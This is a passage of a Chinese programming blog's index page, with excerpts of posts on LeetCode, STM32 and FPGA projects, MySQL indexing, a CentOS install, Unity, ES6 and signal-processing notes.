输入：nums = [2,3,1,1,4]
输出：true
解释：可以先跳 1 步，从下标 0 到达下标 1, 然后再从下标 1 跳 3 步到达最后一个下标。
示例 2：
输入：nums = [3,2,1,0,4]
输出：false
解释：无论怎样，总会到达下标为 3 的位置。但该下标的最大跳跃长度是 0 ， 所以永远不可能到达最后一个下标。
提示：
1 &lt;= nums.length &lt;= 3 * 104
0 &lt;= nums[i] &lt;= 105
来源：力扣（LeetCode）
链接：https://leetcode-cn.com/problems/jump-game
著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。
CODE1: JAVA: class Solution { public boolean canJump(int[] nums) { int n=nums.length; int remote=0; for (int i=0; i&lt;n; i++) { if (i&lt;=remote) { remote = Math.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f50ddec5378d64fff9fac5228ae56d9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9aaa913e2588371fe93aa76586168e02/" rel="bookmark">
			蓝桥杯嵌入式创建第一个工程（点亮led灯）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		蓝桥杯嵌入式创建第一个工程（点亮led灯） 一.keil导入stm32G431RX板级芯片包1.1 下载板级芯片包1.2 导入芯片包1.2.1 我们首先打开keil 点击Pack installer,如图**1.2.2 然后选中file→import 如图**1.2.3 选择我们下好的芯片包即可1.2.4 确定安装成功 二.使用STM32CubeMX配置功能2.1 我们首先点击ACCESS TO MCU SELECTOR 进入配置界面2.2 搜索 STM32G431RBT62.3 配置时钟2.3.1 先点击A-&gt;Z2.3.2 配置频率为72M 2.4 初始化LED的GPIO引脚2.4.1 LED原理图2.4.2 配置引脚 三. 生成工程四.点亮LED并下载到开发板4.1 修改main.c中代码4.2 配置下载器，下载程序。 五. 实验现象 一.keil导入stm32G431RX板级芯片包 蓝桥杯嵌入式的板子是STM32G431RBT6,所以我们需要导入对应的板级芯片包，不然单片机程序会报错，允许不起来。因为芯片包里面有着对应的库函数和依赖。（如：我们学习stm32f03时也需要导入对应的板级芯片包）。下面教大家如何导入！！！！
1.1 下载板级芯片包 你们可以去STM意法半导体官网下载，但是是外网，下载较慢，博主这里百度网盘提供给你们。
链接：https://pan.baidu.com/s/1gViTBOfMTCNbvbe4-k6hJg?pwd=6666 提取码：6666
1.2 导入芯片包 1.2.1 我们首先打开keil 点击Pack installer,如图** 1.2.2 然后选中file→import 如图** 1.2.3 选择我们下好的芯片包即可 最后等待它下载完成即可！
1.2.4 确定安装成功 （1）先点击options for Taget
（2）再选择Device,发现出现了STM32G4 Series ，说明安装成功！！！
二.使用STM32CubeMX配置功能 2.1 我们首先点击ACCESS TO MCU SELECTOR 进入配置界面 2.2 搜索 STM32G431RBT6 因为蓝桥杯嵌入式开发板型号为STM32G431RBT6所以我们在下图进行搜索这样更加快速，搜索完成后再双击型号，如图：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9aaa913e2588371fe93aa76586168e02/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd0f91ae7e78a461207680d53bf33707/" rel="bookmark">
			二叉树的前序中序后序遍历
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DESC: 题目描述 分别按照二叉树先序，中序和后序打印所有的节点。
示例1
输入 {1,2,3} 返回值 [[1,2,3],[2,1,3],[2,3,1]] 备注: n≤106n \leq 10^6n≤106 CODE: import java.util.*; /* * public class TreeNode { * int val = 0; * TreeNode left = null; * TreeNode right = null; * } */ public class Solution { /** * * @param root TreeNode类 the root of binary tree * @return int整型二维数组 */ public int[][] threeOrders (TreeNode root) { // write code here if (root == null) { return null; } List&lt;Integer&gt; preList = new ArrayList(); List&lt;Integer&gt; milList = new ArrayList(); List&lt;Integer&gt; aftList = new ArrayList(); find(root, preList, milList, aftList); int[] preArr = trans(preList); int[] milArr = trans(milList); int[] aftArr = trans(aftList); return new int[] []{preArr, milArr, aftArr}; } public void find (TreeNode node, List&lt;Integer&gt; preList, List&lt;Integer&gt; milList, List&lt;Integer&gt; aftList) { if (node == null) { return; } preList.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cd0f91ae7e78a461207680d53bf33707/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a86eff685073b0b9a54503ff9aac11ad/" rel="bookmark">
			【MySQL笔记】MySQL数据库索引失效的原因解读
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、不满足最左前缀原则
1.1 第1种情况
1.2 第2种情况
1.3 第3种情况
1.4 第4种情况
1.5 第5种情况
1.6 第6种情况
1.7 第7种情况
1.8 第8种情况
二、范围索引列没有放在最后
三、使用了select*
四、索引列上有计算
五、索引列上使用了函数
六、字符类型没加引号
七、用is null和is not null没注意字段是否允许为空
八、like查询左边有%
九、使用or关键字时没注意
十、创建索引的建议 十一、EXPLAIN列的解释
有时候明明已经建立了索引，但是通过explain发现语句并没有使用上索引，这可能是某些原因导致了我们的索引失效。所以本篇主要介绍的是索引失效的常见原因和如何用好索引，给有需要的小伙伴一个参考。
一、不满足最左前缀原则 为什么联合索引不遵循最左匹配原则就会失效？
原因是，在联合索引的情况下，数据是按照索引第一列排序，第一列数据相同时才会按照第二列排序。也就是说，如果我们想使用联合索引中尽可能多的列，查询条件中的各个列必须是联合索引中从最左边开始连续的列。如果我们仅仅按照第二列搜索，肯定无法走索引。
我们建立了两个索引：idx_code_age_name( code , age , name )联合索引 和 idx_height(height)普通索引，下面实例按照这两个来说明：
1.1 第1种情况 where 条件后的字段包含了联合索引的所有索引字段，并且顺序是按照： code 、 age 、name
执行sql如下：
explain select * from test1 where code='001' and age=18 and name='张飞' ; 可以看出已经走了联合索引idx_code_name_age，并且索引的长度是 188， 188 = 30 * 3 + 2 + 30 * 3 + 2 + 4 ，索引是使用充分的，索引使用效率最佳。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a86eff685073b0b9a54503ff9aac11ad/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/de53cd4e11f0f0b8328c097fa3a62ce9/" rel="bookmark">
			【【IIC模块Verilog实现---用IIC协议从FPGA端读取E2PROM】】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		IIC模块Verilog实现–用IIC协议从FPGA端读取E2PROM 下面是 design 设计
I2C_dri.v module IIC_CONTROL #( parameter SLAVE_ADDR = 7'b1010000 , // E2PROM 从机地址 parameter CLK_FREQ = 26'd50_000_000 , // 50MHz 的时钟频率 parameter I2C_FREQ = 18'd250_000 // SCL 的时钟频率 ) ( input clk , input rst_n , // ---------------------------------------------- // input [15 : 0] i2c_addr , // 地址 input [7 : 0] i2c_data_w , // 数据 input i2c_rh_wl , // 判断 是 read or write input bit_control , // 1是 16位 0 是 8位 input i2c_exec , // ------------------------------------------------ // output reg dri_clk , output reg [7 : 0] i2c_data_r , output reg i2c_ack , output reg i2c_done , // -------------------------------------------------- // output reg scl , inout sda ); // --------------------------------------------------------// // next is define // // --------------------------------------------------------// reg [9 : 0] clk_cnt ; wire [8 : 0] dri_cnt ; reg [2 : 0] state ; reg [2 : 0] next_state ; reg st_done ; // 在 状态机里面用来提示数据完成可以跳转 reg sda_dir ; // sda方向控制器 reg sda_out ; // 选择FPGA输入模式之后赋予sda线上 wire sda_in ; // sda输入信号 reg [6 : 0] cnt ; // 我们为了第三部分状态机而准备的 reg [15: 0] addr_save ; // 地址存储 reg [7 : 0] data_w_save ; // 数据写的暂存 reg wr_flag ; // 0 是 写 1 是 读 // 这三个是 暂存的方便调度的 reg [7 : 0] data_r_save ; // 读到的数据存储方便整合 // --------------------------------------------------------- // // parameter define // parameter st_idle = 3'b000 ; // 空闲状态 parameter st_sladdr = 3'b001 ; // 发送器件地址 parameter st_addr16 = 3'b010 ; // 发送高八位地址 parameter st_addr8 = 3'b011 ; // 发送低八位地址 parameter st_data_wr = 3'b100 ; // 写数据 parameter st_addr_rd = 3'b101 ; // 再次发送器件地址读 parameter st_data_rd = 3'b110 ; // 读数据 parameter st_stop = 3'b111 ; // 结束操作停止位 // ---------------------------------------------------- // // next is main code // // -------------------------------------------------------// assign dri_cnt = (CLK_FREQ/I2C_FREQ ) &gt;&gt; 2 ; always@(posedge clk or negedge rst_n ) begin if(rst_n == 0) begin dri_clk &lt;= 0 ; clk_cnt &lt;= 0 ; end else if( clk_cnt == dri_cnt[8:1] - 1) begin clk_cnt &lt;= 0 ; dri_clk &lt;= ~dri_clk ; end else begin dri_clk &lt;= dri_clk ; clk_cnt &lt;= clk_cnt + 1 ; end end // 下面开始状态机的叙述 // 同步时序描述状态转移 always@(posedge dri_clk or negedge rst_n) begin if(rst_n == 0) begin state &lt;= st_idle ; end // 处于空闲状态 else begin state &lt;= next_state ; end end // 组合逻辑判断状态转移条件 always@(*) begin next_state &lt;= st_idle ; case(state) st_idle : begin if(i2c_exec == 1) begin next_state &lt;= st_sladdr ; end else begin next_state &lt;= st_idle ; end end // 当触发了i2c_exec 时候 可以由 空闲状态转移到 st_sladdr : begin if(st_done == 1) begin if(bit_control == 1) next_state &lt;= st_addr16 ; else next_state &lt;= st_addr8 ; end else begin next_state &lt;= st_sladdr ; end end // 当 触发了 st_done 之后 通过 bit_control 选择是低八位 还是高八位的传输 st_addr16 : begin if(st_done == 1) begin next_state &lt;= st_addr8 ; end else begin next_state &lt;= st_addr16 ; end end // 高位 用完 轮到 低位的 传输 st_addr8 : begin if(st_done == 1) begin if(wr_flag == 0) next_state &lt;= st_data_wr ; else next_state &lt;= st_addr_rd ; end else begin next_state &lt;= st_addr8 ; end end // 先来判断 写数据的 st_data_wr 数据代号是 4 st_data_wr : begin if(st_done == 1) begin next_state &lt;= st_stop ; end else begin next_state &lt;= st_data_wr ; end end // st_addr_rd : begin if(st_done == 1) begin next_state &lt;= st_data_rd ; end else begin next_state &lt;= st_addr_rd ; end end // st_data_rd : begin if(st_done == 1) begin next_state &lt;= st_stop ; end else begin next_state &lt;= st_data_rd ; end end // st_stop : begin if(st_done == 1) begin next_state &lt;= st_idle ; end else begin next_state &lt;= st_stop ; end end default: next_state &lt;= st_idle ; endcase end / 下面来考虑另一个状态机的第三部分 --- 时序电路描述状态输出 // 设置一个变量 来控制 SDA的朝向 assign sda = sda_dir ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/de53cd4e11f0f0b8328c097fa3a62ce9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c5978f5fda0d6390f7bcf720ab53426/" rel="bookmark">
			【大数据学习笔记】新手学习路线图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第1阶段-数据仓库基 1.MysQL关系型数据库 （MySQL介绍、MySQL安装、MySQL基础语法、MySQL高级语法、MySQL系统架构、MySQL存储引擎、MySQL索引、MySQL备份恢复、MySQL主从、主主复制、MySQL存储过程、MySQL分库分表、MySQL综合案例、MySQL性能优化）
2.Python编程技术 （Python基础语法、Python循环、Python集合、Python函数、Python面向对象、Python操作各种数据库介绍）
第2阶段-Linux &amp;Hadoop 1.Hadoop （大数据介绍、Hadoop三件套、HDFS系统架构、HDFS之Block、HDFS之FSImage和Edits
HDFS之Checkpoint、HDFS的读和写流程、HDFS的Shell操作、YARN系统架构、YARN的资源调度策略、YARN的调度配置、基于YARN的作业提交）
2.Linux操作系统 （命令操作、权限管理、软件安装、系统内核剖析）
3.Shell脚本编程 （shell介绍、Shell基础语法、Shell高级语法、Shell编程案例）
第3阶段-数据仓库与ETL技术 1.Hive （Hive的介绍、Hive安装部署、Hive元数据、Hive内外部表、Hive数据类型、Hive基础SQL、Hive分区、Hive分桶、Hive高级SQL、Hive常用自带函数、Hive窗口函数、Hive自定义函数）
2.Datax （DataX30概览、DataX3.0框架设计、DataX3.0插件体系、DataX3.0核心架构DataX3.0六大优势、DataX的Reader插件、DataX的Writer插件、DataX数据同步案例、DataX数据同步优化）
3.Hue （Hue概述、Hue系统架构、Hue连接器、Hue编辑器、Hue操作）
4.ClickHouse （特征与性能、集群安装部署、集群基础操作、数据类型、ClickHouse的库表引擎、ClickHouse常见函数、Column、Field和DataType、Block与Block流、Parser与lnterpreter、分片与副本、客户端工具）
5.DolphinScheduler （DolphinScheduler介绍、DolphinScheduler特性、DolphinScheduler系统架构、DolphinScheduler启动流程、DolphinScheduler架构设计思想、DolphinScheduler安装部署、DolphinScheduler调度项目、DolphinScheduler调度任务）
6.数据仓库技术 （数据仓库概述、数据仓库架构、数据建模、事实表和维度表、主题域与主题、拉链表、多维体系结构、数据仓库规范、元数据管理、离线与实时数据仓库）
7.零售数据仓库项目 （项目介绍、技术架构、项目架构、项目流程、项目实施与部署）
8.Flume （Flume介绍、Flume系统架构、Flume组件、Flume的Source、Flume的Channel、Flume的Sink、Flume的拦截器、Flume的选择器、Flume案例、Flume优化）
9.SparkSQL （Spark介绍、SparkSQL介绍、SparkSQL的数据抽象、SparkSQL数据装载、SparkSQL数据落地、SparkSQL自带函数、SparkSQL自定义函数、SparkSQL与Hive整合、SparkSQL底层运行流程）
第4阶段-BI数据分析与可视化 1.零售BI数据平台项 （项目介绍、项目技术、项目流程、项目研发与实施）
2.Superset （Superset概览、Superset安装部署、Superset数据源、Superset的Charts、Superset的Dashboards、Superset的SOL-Lab、Superset地图可视化、Superset报表案例、Superset大屏案例、Superset权限管理）
3.FineBI&amp;FineReport （帆软介绍、安装部署与启动、初始化设置、初识FineBI、FineBI俗语、FineBI与数据源整合、数据加工、构建图表与数据分析、仪表板及其分享、函数应用、数据分析模型、数据处理与计算、表格与图表组件交互与组件联动、数据跳转与钻取、数据切片与筛选）
第5阶段-项目自研 1.自研数据仓库项目 （自研数据仓库项目、云学习大数据平台项目、云学习用户画像项目、电商大数据平台项目、问答大数据平台）
第6阶段-专题拓展 1.数据质量与治理专题 （数据质量介绍、数据治理介绍、元数据管理介绍、数据血缘介绍、基于DolphinScheduler的质量案例、基于Atlas的数据质量与治理案例）
2.阿里云大数据服务专题 （阿里云大数据服务介绍、DataWorks和MaxCompute组件、阿里云数据集成与其它常用组件、离线数据开发、任务调度）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/81a9926fd39c4b324a12e7e4a36ecbce/" rel="bookmark">
			ArrayList源码学习笔记（3）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		时隔两年，重新读ArrayList源码，轻松了很多，以问题的方式记录一下收获
装饰器模式
注释中提到ArrayList本身不是线程安全的，注释如下： * &lt;p&gt;&lt;strong&gt;Note that this implementation is not synchronized.&lt;/strong&gt; * If multiple threads access an &lt;tt&gt;ArrayList&lt;/tt&gt; instance concurrently, * and at least one of the threads modifies the list structurally, it * &lt;i&gt;must&lt;/i&gt; be synchronized externally. (A structural modification is * any operation that adds or deletes one or more elements, or explicitly * resizes the backing array; merely setting the value of an element is not * a structural modification.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/81a9926fd39c4b324a12e7e4a36ecbce/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/39d152d72eb9259dd0718e7f049d81ad/" rel="bookmark">
			中伟视界：智慧矿山又一项目落地应用，皮带撕裂、打滑、洒煤、跑偏、异物、大块煤、划痕、堵料等功能详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着智能化技术的不断发展，智慧矿山项目已经在全国范围内得到了广泛的应用和认可。作为智慧矿山的又一新项目，皮带故障解决方案已经取得了令人瞩目的成绩，在多个煤矿的实际运用中展现了出色的效果。
在煤矿生产过程中，皮带撕裂、打滑、洒煤、跑偏、异物、大块煤、划痕、堵料等故障是比较常见的问题，这些故障如果不能及时有效地解决，将会影响到煤矿的正常生产。而智慧矿山的皮带故障解决方案正是为了解决这些问题而设计的。
针对皮带撕裂问题，智慧矿山项目提供了在线监测系统，能够实时监控皮带的运行状态，一旦发现撕裂迹象，系统会立即发送预警信息，让操作人员能够及时采取措施，避免撕裂造成的严重事故。
针对打滑和洒煤问题，智慧矿山项目通过智能控制系统，可以实现对皮带张力的实时调整，有效地避免了打滑现象的发生，减少了洒煤事故的发生率。
针对跑偏、异物、大块煤、划痕、堵料等问题，智慧矿山项目结合了图像识别和智能机器人技术，能够对皮带进行全方位的监测和检测，及时发现并清除各种障碍物，确保皮带的正常运行。
除了以上解决方案，智慧矿山项目还提供了定制化的故障诊断和维护服务，帮助煤矿进行全面的设备检修和维护，最大限度地提高了设备的运行效率和可靠性。
总的来说，智慧矿山的皮带故障解决方案，不仅解决了煤矿生产过程中常见的各种问题，还在提高生产效率、降低安全风险方面发挥了重要作用。相信随着智能化技术的不断创新和应用，智慧矿山项目将会在煤矿行业发挥更大的作用，为煤矿的安全生产和可持续发展做出更多贡献。
中伟视界矿山版AI盒子包含的算法有：皮带运行状态识别（启停状态）、运输带有无煤识别、煤流量检测、皮带跑偏、异物检测、下料口堵料、井下堆料、提升井堆煤检测、提升井残留检测、输送机空载识别、传输机坐人检测、行车不行人、佩戴自救器检测、风门监测、运料车通行识别、工作面刮板机监测、掘进面敲帮问顶监控、护帮板支护监测、人员巡检、入侵检测、区域超员预警、未戴安全帽检测、未穿工作服识别、火焰检测、离岗睡岗识别、倒地检测、摄像机遮挡识别、摄像机挪动识别等等算法。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/596a12c5d5a6afd872012b795ddee151/" rel="bookmark">
			在VMware安装centos 7：详细教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装准备工作 本地虚拟机：我这里使用的是VMware® Workstation 17 Pro centos7系统ISO镜像：我这里使用的是CentOS-7-x86_64-DVD-2009.iso，具体的下载地址是在阿里云官方镜像站：centos-7.9.2009-isos-x86_64安装包下载_开源镜像站-阿里云 (aliyun.com)，如果需要其他版本可自行检索。 安装过程 虚拟机创建 打开VMware，点击第一个大图标，开始创建新的虚拟机；
这时候在安装方式上会面临两个选择，1、典型（推荐）；2、自定义；如果你是一个老手，可以选择自定义；如果是新手，或者就是懒，选择典型（推荐）也行；这里我选择了自定义，可以让各位看一看自定义的方式，包含有哪些配置项，然后下一步；
大多数据情况下，在VMware中安装Linux系统基本上是采用iso镜像，当然也可以使用光盘，所以这里有三个选项：第一个：选择使用光盘；第二个：使用本地的镜像文件，如果是虚拟机上从未安装过，应该空的，我这里之前安装过，所以这里可以看到之前的历史记录；第三个：就是先创建一个包含空白硬盘的虚拟机，稍后再安装操作系统；这里我选择第三个，然后下一步；
到这里后，选择客户机操作系统是Linux，然后选择版本是Centos 7 64位，如果你安装是其他的版本，可以再选择一下，这里是一个选择下拉框，包含有常见的Linux版本；然后下一步；
到这一步，设置一下虚拟机名称以及虚拟机的安装位置，当然也可以使用默认的；然后下一步；
到这一步，主要是两个事：设置虚拟机的硬盘大小，默认是20G，可以根据自身实际硬盘容易以及需要进行灵活设置；再者，就是设置虚拟机硬盘的存储方式，主要是两种：存储为单个文件或者是拆分成多个文件，这里选择第二种拆分成多个文件；然后下一步；
到这一步，可以直接点击完成，这样一个包含空白硬盘的虚拟机就创建完成了，后面再来设置虚拟机的硬件、镜像等配置信息，不过，这样有一点麻烦了，直接设置好不就完了，所以这里点击自定义硬件，开始相关的配置；
自定义硬件这里主要设置几个参数：1、内存；2、处理器；3、镜像文件；4、网络适配器；
设置虚拟机内存；
设置镜像文件；
设置网络适配器：这里选择桥接模式；
虚拟机的内存、cpu、镜像文件、网络适配器这些参数设置完后，点击关闭，就进入到下面这个界面，然后点击完成，虚拟机就创建完成了；
启动虚拟机 虚拟机创建完成后，选择创建好的虚拟机，然后开启虚拟机；开启虚拟机的同时，也开始了centos的安装初始化；
初始化完成后，需要先设置一下系统语言，这里选择简体中文；然后点击继续；
进入到下一步后，这里主要是设置一下软件的安装源、软件选择，以及系统的安装位置、网络和主机名等参数信息，这里全部选择默认并点击完成即可; 软件、系统相关配置参数，设置完成后，可以看到安装位置选择了自动分区，网络已连接；然后点击开始安装centos7操作系统;
安装过程中需要手动来设置一下root账户的密码，以及创建一个非root的用户；这里注意一下，密码强度稍微高一些，否则可能设置不成功；
这里已经设置完了root账户的密码，另外创建了一个非root的用户；然后点击完成配置，接着就是等待安装过程结束；
安装过程结束后，会提示重启系统；然后点击重启，虚拟机开始重启了；
重启完成后，用root账户密码登入系统；
配置静态IP 因为在安装过程中，网络适配器采用了默认配置，即动态ip，所以这里把动态ip改为静态ip，这样方便使用ssh工具进行连接；
执行vi /etc/sysconfig/network-scripts/ifcfg-ens33，可以看到默认的网络配置信息：
然后修改BOOTPROTO=“static”，然后再设置静态ip、网关、子网掩码、DNS1、DNS2，修改完成并保存；然后执行systemctl restart network重启一下网卡程序，让静态ip的设置信息生效；
执行ip addr命令，可以看到设置的静态ip已经生效；
使用SSH工具连接虚拟机 这里给大家安利一个ssh工具，名字叫finalshell，FinalShell是一款功能强大的Windows终端，它支持多个标签页、内置SSH客户端、SFTP客户端、Telnet客户端、SCP客户端和FTP客户端等。它还具有自动补全、命令行历史记录、正则表达式、宏录制和编辑器等一系列实用功能，可大大提高工作效率。
此外，FinalShell还支持各种主题，可以根据个人喜好进行定制。它不仅是一款ssh客户端，还是功能强大的开发、运维工具，能充分满足开发、运维需求。其主要特性包括：云端同步、免费海外服务器远程桌面加速、ssh加速、本地化命令输入框、支持自动补全、命令历史、自定义命令参数等。最重要的是开源、免费，再也不用满世界找xshell的破解方法了；
把finalshell作为一个ssh工具来用，使用方法也很简单，输入要连接的主机、用户名、密码，然后确定并开始连接就可以了；finalshell的功能还是很丰富的，有兴趣可以自己下载一下，细细研究一番；
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4a3032c02c0d0d4f5ed1d33321af2b4a/" rel="bookmark">
			Unity 通过鼠标点击与射线检测实现与物体交互
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Unity中，我们可以通过鼠标点击发送射线，然后检测碰撞信息，从而达到与物体交互的功能。
比如我要实现鼠标点击到某个物体时，激发隐藏任务，具体可以这样写：
public GameObject HideTasks1; // Start is called before the first frame update void Start() { } // Update is called once per frame void Update() { if (Input.GetMouseButtonDown(0)) { Ray ray = Camera.main.ScreenPointToRay(Input.mousePosition); RaycastHit hit; if (Physics.Raycast(ray, out hit)) { // 射线与物体相交，处理鼠标点击事件 GameObject clickedObject = hit.collider.gameObject; if(clickedObject.tag =="HideTasks1") { HideTasks1.SetActive(true); } } } } 效果如下：
Unity 通过鼠标点击与射线检测实现与物体交互
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9a3e5ac00d27bb75f2c0bc0814d8e2b1/" rel="bookmark">
			Microsoft Edge使用方法和心得
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Microsoft Edge使用方法和心得 大家好，我是豪哥，一名来自杭州的Java程序员，今天我想分享一下我对Microsoft Edge的使用方法和心得。作为一名热爱编程的程序员，我发现一个高效的浏览器对于我们的工作和学习至关重要。而Microsoft Edge正是一个强大而又充满创新的选择。
为什么选择Microsoft Edge？ 在选择浏览器的时候，我考虑了许多因素，包括性能、安全性、以及与其他Microsoft产品的兼容性。Edge在这些方面都表现得非常出色。其采用了Chromium内核，不仅提供了流畅的浏览体验，还确保了与现代网页技术的良好兼容。
使用方法详解 1. 个性化设置 Microsoft Edge提供了丰富的个性化设置，让你的浏览器符合你的需求。你可以选择不同的主题、布局和扩展，使浏览器更符合你的审美和工作习惯。
2. 集成Office Online 作为一名程序员，我常常需要处理文档和表格。Edge与Office Online的深度集成让我可以直接在浏览器中编辑和查看Office文档，极大地提高了工作效率。
3. 智能搜索 Edge的智能搜索功能让我在浏览器中无需跳转到搜索引擎页面就能获取所需信息。只需在地址栏中输入关键词，Edge就会智能展示相关搜索结果，省去了不少繁琐步骤。
4. 收藏和同步 浏览器书签的管理对于我们来说是非常重要的。Edge提供了强大的收藏夹功能，并支持跨设备同步。这意味着，无论我是在工作电脑上还是在手机上浏览，都可以轻松访问我收藏的网页。
心得体会 使用了一段时间的Microsoft Edge，我发现它不仅仅是一个浏览器，更是一项提升工作效率的利器。其简洁的界面、高效的性能以及与其他Microsoft产品的协同工作，使得我在编程和日常办公中都能事半功倍。
总的来说，如果你是一个注重工作效率的人，喜欢简洁界面和智能功能，那么Microsoft Edge绝对是一个值得一试的选择。
希望我的分享能够对你有所帮助，如果你有什么使用心得或者建议，也欢迎在评论区和我分享。让我们一起探讨如何更好地利用这个强大的工具！
谢谢阅读，如果觉得有帮助，记得点赞、关注，也可以收藏起来，方便日后查阅哦！
希望这篇博客能够满足你的需求，有任何需要修改的地方或者添加的内容，请随时告诉我。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/55949331d6958191f4942f593ea41cf5/" rel="bookmark">
			探索JavaScript ES6的八种常见使用技巧：开启现代编程之旅
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在现代Web开发中，JavaScript ES6（ECMAScript 6）已经成为了开发者们的首选。ES6引入了许多强大的功能和语法改进，为我们提供了更加优雅和高效的编程方式。在本篇博文中，我们将探索八种常见的JavaScript ES6使用技巧，帮助你提升开发效率，并为你的代码注入新的活力。无论你是初学者还是有经验的开发者，相信本文都能为你带来新的启发。
一、解构赋值（Destructuring Assignment）
解构赋值是ES6中一项强大而简洁的特性，能够让我们从数组或对象中快速提取值，并赋给变量。适用于场景包括函数参数传递、对象属性提取和数组元素交换等。让我们来看一个案例代码：
// 数组解构赋值 const fruits = ['apple', 'banana', 'orange']; const [first, second, third] = fruits; console.log(first); // 输出：'apple' console.log(second); // 输出：'banana' console.log(third); // 输出：'orange' // 对象解构赋值 const person = { name: 'John', age: 30 }; const { name, age } = person; console.log(name); // 输出：'John' console.log(age); // 输出：30 二、箭头函数（Arrow Functions）
箭头函数是ES6中定义函数的一种新语法，具有更简洁的写法和绑定this的特性。适用于场景包括回调函数、数组方法和对象方法定义等。让我们看一个案例代码：
// 常规函数 function multiply(x, y) { return x * y; } // 箭头函数 const multiply = (x, y) =&gt; x * y; console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/55949331d6958191f4942f593ea41cf5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd1b33201d8875a3816268fabd029664/" rel="bookmark">
			信号与线性系统翻转课堂笔记10——傅里叶变换的性质
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		信号与线性系统翻转课堂笔记10——傅里叶变换的性质 The Flipped Classroom10 of Signals and Linear Systems 对应教材：《信号与线性系统分析（第五版）》高等教育出版社，吴大正著
一、要点 （1，重点）熟练掌握傅里叶变换的各种性质，能利用性质来求傅里叶变换，了解各种性质的物理含义及其应用价值；
（2）了解信号能量谱和功率谱的概念；
（3）掌握采用MATLAB的符号运算和数值运算的方式来求信号的傅里叶变换；
（4）初步了解线性相位、幅度调制（频谱搬移）、频谱分析中的测不准原理等与实际应用密切相关的概念。
二、问题与解答 1、将非周期信号f(t)在时域进行平移得到f(t-t_0 )。与f(t)的频谱相比，f(t-t_0 )的幅度和相位频谱分别会发生何种变化？设f(t)为宽度为2、幅度为1的 矩形脉冲信号（参见教材图4.5-3(a)），用MATLAB的符号运算方式（fourier函数），分别求f(t)和f(t-0.2)的傅里叶变换并分别画出它们的幅度和相位频谱，对比分析两者的异同。讨论：为什么说f(t-0.2)的相位频谱是一种“线性相位”？如何从时域的角度理解线性相位的含义？如果改变平移量t_0的大小，会对相位频谱产生什么影响？请用MATLAB画出两种不同 对应的相位频谱并总结分析。
2、采用MATLAB数值计算的方式，重新计算上一题中f(t)和f(t-0.2)的幅度和相位频谱，与符号计算的结果进行比较，并请解释计算程序的基本原理。傅里叶变换的数值计算方法和程序，已经在预备训练三中提出了要求。未能完成预备训练三所布置任务的同学（已经完成的同学，请采用自己的数值计算程序），可参考以下所给出程序。请读懂该程序原理，并根据信号f(t)的不同，设置适当的信号取样间隔T、信号截取范围和频谱分析范围。
数值计算参考程序：
